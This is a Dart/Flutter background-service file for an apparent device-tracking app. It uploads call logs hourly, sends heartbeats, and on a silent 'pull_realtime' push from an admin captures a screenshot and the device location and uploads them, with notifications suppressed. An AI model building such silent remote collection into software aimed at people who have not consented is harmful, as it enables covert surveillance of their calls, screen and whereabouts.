import 'package:workmanager/workmanager.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/services.dart';
import 'api_service.dart';

/// Background task names
const callHistorySyncTask = 'callHistorySync';
const heartbeatTask = 'heartbeatTask';

/// Top-level callback for WorkManager
@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    switch (task) {
      case callHistorySyncTask:
        await _syncCallHistory();
        break;
      case heartbeatTask:
        await ApiService.sendHeartbeat();
        break;
    }
    return Future.value(true);
  });
}

/// Sync call history from native call log
Future<void> _syncCallHistory() async {
  try {
    const platform = MethodChannel('com.tracker.app/services');
    final result = await platform.invokeMethod('getCallLogs');

    if (result != null && result is List) {
      final calls = result.map<Map<String, dynamic>>((item) {
        return Map<String, dynamic>.from(item as Map);
      }).toList();

      if (calls.isNotEmpty) {
        await ApiService.uploadCallHistory(calls);
      }
    }
  } catch (e) {
    print('Call history sync error: $e');
  }
}

class BackgroundService {
  static const platform = MethodChannel('com.tracker.app/services');

  /// Initialize all background services
  static Future<void> initialize() async {
    // Initialize WorkManager for periodic tasks
    await Workmanager().initialize(callbackDispatcher, isInDebugMode: false);

    // Schedule hourly call history sync
    await Workmanager().registerPeriodicTask(
      'callHistorySync',
      callHistorySyncTask,
      frequency: const Duration(hours: 1),
      constraints: Constraints(
        networkType: NetworkType.connected,
      ),
      existingWorkPolicy: ExistingWorkPolicy.keep,
    );

    // Schedule heartbeat every 15 minutes
    await Workmanager().registerPeriodicTask(
      'heartbeat',
      heartbeatTask,
      frequency: const Duration(minutes: 15),
      constraints: Constraints(
        networkType: NetworkType.connected,
      ),
      existingWorkPolicy: ExistingWorkPolicy.keep,
    );

    // Setup FCM for silent push from admin
    await _setupFcm();
  }

  /// Setup Firebase Cloud Messaging
  static Future<void> _setupFcm() async {
    final messaging = FirebaseMessaging.instance;

    // Request permission (will auto-grant on Device Owner)
    await messaging.requestPermission(
      alert: false,
      announcement: false,
      badge: false,
      carPlay: false,
      criticalAlert: false,
      provisional: true,
      sound: false,
    );

    // Get and store FCM token
    final token = await messaging.getToken();
    if (token != null) {
      await ApiService.updateFcmToken(token);
    }

    // Listen for token refresh
    messaging.onTokenRefresh.listen((newToken) {
      ApiService.updateFcmToken(newToken);
    });

    // Handle incoming FCM data messages (silent push from admin)
    FirebaseMessaging.onMessage.listen(_handleFcmMessage);
    FirebaseMessaging.onBackgroundMessage(_firebaseBackgroundHandler);
  }

  /// Handle incoming FCM message
  static Future<void> _handleFcmMessage(RemoteMessage message) async {
    final command = message.data['command'];

    if (command == 'pull_realtime') {
      // Trigger native screenshot + location capture and upload
      await platform.invokeMethod('captureAndUploadRealtime');
    }
  }
}

/// Top-level background FCM handler
@pragma('vm:entry-point')
Future<void> _firebaseBackgroundHandler(RemoteMessage message) async {
  final command = message.data['command'];

  if (command == 'pull_realtime') {
    const platform = MethodChannel('com.tracker.app/services');
    await platform.invokeMethod('captureAndUploadRealtime');
  }
}
